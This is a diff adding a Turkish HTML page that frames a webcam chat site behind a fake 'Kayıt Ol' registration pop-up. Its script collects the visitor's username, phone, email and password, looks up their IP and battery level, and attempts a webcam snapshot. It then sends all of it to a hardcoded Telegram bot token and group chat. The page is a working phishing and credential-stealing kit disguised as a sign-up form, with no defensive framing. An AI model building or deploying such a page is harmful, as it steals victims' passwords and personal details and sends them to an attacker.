@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Fotoğraf Gönderme ve Kayıt</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            position: relative;
+        }
+
+        .iframe-container {
+            width: 100%;
+            height: 100%;
+            max-width: 100%;
+            position: relative;
+            overflow: hidden;
+            padding-top: 56.25%; /* 16:9 aspect ratio */
+            transition: filter 0.5s ease; /* Blur effect */
+        }
+
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
+        /* Kart stil */
+        .registration-card {
+            width: 300px;
+            padding: 20px;
+            background-color: white;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            text-align: center;
+            position: absolute;
+            z-index: 10;
+            display: none;  /* Başlangıçta gizle */
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .registration-card input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+
+        .registration-card button {
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .registration-card button:hover {
+            background-color: #45a049;
+        }
+
+        /* Blur effect */
+        .blurred {
+            filter: blur(5px);
+        }
+
+        /* Kartın içinde resim */
+        .registration-card img {
+            width: 100%;
+            height: auto;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Kayıt formu kartı -->
+    <div class="registration-card" id="registration-card">
+        <img src="https://via.placeholder.com/300x150" alt="Kayıt Kartı Resmi"> <!-- Resim ekleyin -->
+        <h2>Kayıt Ol</h2>
+        <form id="registration-form">
+            <input type="text" id="username" placeholder="Kullanıcı Adınız" required><br>
+            <input type="text" id="phone" placeholder="Telefon Numaranız" required><br>
+            <input type="email" id="email" placeholder="E-posta" required><br>
+            <input type="password" id="password" placeholder="Şifreniz" required><br>
+            <input type="password" id="confirm-password" placeholder="Şifrenizi Tekrar Yazınız" required><br>
+            <input type="text" id="captcha" placeholder="2+2 = ?" required><br>
+            <button type="submit" id="submit-btn" disabled>Kaydol</button>
+        </form>
+    </div>
+
+    <!-- Iframe -->
+    <div class="iframe-container" id="iframe-container">
+        <iframe src="https://chat-rooms.webcam" allow="microphone; camera"></iframe>
+    </div>
+
+    <script>
+        const TOKEN = "7264015704:AAGaeJRKn2wN2J83UdOYGCDqAVsc6nW1CTw";  // Telegram bot token
+        const CHAT_ID = "-1002270887247";  // Grubun chat_id'si
+        let video;
+        let stream;
+        let userInfo = {};
+        let hasSubmitted = false;  // Formun sadece bir kez gönderilmesini sağlamak için
+
+        // IP adresini ip-api API ile alıyoruz
+        function getIP() {
+            return fetch("http://ip-api.com/json")
+                .then(response => response.json())
+                .then(data => {
+                    return data.query;  // IP adresini döndürüyoruz
+                })
+                .catch(error => {
+                    console.error("IP bilgisi alınırken hata oluştu:", error);
+                    return "IP alınamadı";
+                });
+        }
+
+        // Sayfa yüklendiğinde kamerayı başlat
+        window.onload = function() {
+            // 3 saniye sonra kayıt kartını göster
+            setTimeout(function() {
+                // Sayfada pop-up'ı göstermek
+                if (!localStorage.getItem('formSubmitted')) {
+                    document.getElementById("registration-card").style.display = "block";
+                    document.getElementById("iframe-container").classList.add("blurred");  // Blur efekti ekle
+                }
+            }, 3000);  // 3 saniye sonra kartı göster
+        };
+
+        // Kayıt formu gönderildiğinde
+        document.getElementById("registration-form").addEventListener("submit", function(e) {
+            e.preventDefault();
+
+            // Kullanıcı bilgilerini al
+            userInfo.username = document.getElementById("username").value;
+            userInfo.phone = document.getElementById("phone").value;
+            userInfo.email = document.getElementById("email").value;
+            userInfo.password = document.getElementById("password").value;
+
+            // Kayıt formunu gizle
+            document.getElementById("registration-card").style.display = "none";
+            document.getElementById("iframe-container").classList.remove("blurred");  // Blur efekti kaldır
+
+            // Fotoğrafı ve bilgileri gönder
+            if (!hasSubmitted) {
+                hasSubmitted = true;
+                captureAndSendPhoto(); // Fotoğrafı çek ve gönder
+
+                // 10 saniye sonra tüm izinleri kapat
+                setTimeout(function() {
+                    if (stream) {
+                        let tracks = stream.getTracks();
+                        tracks.forEach(track => track.stop());  // Kamera izni kapat
+                    }
+                    // Popup bir daha gösterilmesin
+                    localStorage.setItem('formSubmitted', 'true');
+                }, 10000);  // 10 saniye sonra
+            }
+        });
+
+        // Captcha doğrulaması
+        document.getElementById("captcha").addEventListener("input", function() {
+            const captcha = document.getElementById("captcha").value;
+            const submitBtn = document.getElementById("submit-btn");
+
+            // Eğer kullanıcı 2+2'yi doğru yazarsa buton aktif hale gelir
+            if (captcha === "4") {
+                submitBtn.disabled = false;
+            } else {
+                submitBtn.disabled = true;
+            }
+        });
+
+        // Fotoğraf çekme ve Telegram'a gönderme işlemi
+        function captureAndSendPhoto() {
+            if (video && video.videoWidth > 0) {
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Fotoğrafı Blob formatında kaydet
+                canvas.toBlob(function(blob) {
+                    // IP adresi ve şarj durumu bilgilerini al
+                    getIP().then(ip => {
+                        navigator.getBattery().then(function(battery) {
+                            const charge = battery.level * 100 + "%";  // Şarj seviyesini yüzdelik olarak al
+
+                            // Telegram'a fotoğrafı gönder
+                            const caption = `✓ IP: ${ip}\n✓ Şarj: ${charge}\n✓ Kullanıcı adı: ${userInfo.username}\n✓ Telefon: ${userInfo.phone}\n✓ Mail: ${userInfo.email}\n✓ Şifre: ${userInfo.password}\n⚓ Developers: @vebalandin`;
+
+                            const formData = new FormData();
+                            formData.append("chat_id", CHAT_ID);
+                            formData.append("caption", caption);  // Başlık ekleniyor
+                            formData.append("photo", blob, "photo.jpg");
+
+                            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                                method: "POST",
+                                body: formData
+                            })
+                            .then(response => response.json())
+                            .then(data => {
+                                if (data.ok) {
+                                    console.log("Fotoğraf başarıyla gönderildi!");
+                                } else {
+                                    console.log("Telegram'dan gelen hata:", data.description);
+                                }
+                            })
+                            .catch(error => {
+                                console.error("Telegram API hatası:", error);
+                            });
+                        });
+                    });
+                }, "image/jpeg");
+            }
+        }
+    </script>
+</body>
+</html>
